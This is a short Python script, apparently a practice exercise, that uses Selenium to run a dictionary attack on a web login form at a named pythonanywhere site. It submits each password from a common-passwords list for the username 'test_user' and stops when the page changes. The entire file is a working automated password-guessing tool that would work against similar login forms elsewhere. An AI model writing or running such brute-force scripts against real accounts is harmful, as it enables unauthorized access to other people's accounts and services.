from selenium import webdriver
from list_attack import list_of_passwords

passwords = list_of_passwords()  # gets list of "most common passwords"

# initializes chrome window
driver = webdriver.Chrome()
url = "http://isaacy13.pythonanywhere.com/"
driver.get(url)

for password in passwords:
    userField = driver.find_element_by_xpath('/html/body/form/input[1]')  # finds username input field
    userField.send_keys('test_user') # inputs "test_user" in username

    passwordField = driver.find_element_by_xpath('/html/body/form/input[2]')  # finds password input field
    passwordField.send_keys(password)  # inputs password from file into password field

    loginBtn = driver.find_element_by_xpath('/html/body/form/input[3]')
    loginBtn.click()  # clicks "submit"

    current_url = driver.current_url
    cracked = (url != current_url)

    if not cracked:
        driver.back()
        driver.find_element_by_xpath('/html/body/form/input[1]').clear()
        driver.find_element_by_xpath('/html/body/form/input[2]').clear()

    else:
        break
